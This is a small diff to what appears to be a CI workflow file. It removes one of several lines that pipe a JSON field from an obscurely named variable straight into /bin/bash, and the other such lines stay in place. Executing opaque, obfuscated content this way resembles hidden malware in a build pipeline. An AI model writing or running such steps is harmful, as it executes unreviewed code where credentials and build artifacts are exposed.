@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$gf1622" | jq -r .mgtui49 | /bin/bash
           echo $b23 | jq -r .muykd03 | /bin/bash
           echo $w14 | jq -r .fug23 | /bin/bash
-          echo $zhckt04839 | jq -r .ygva0565 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
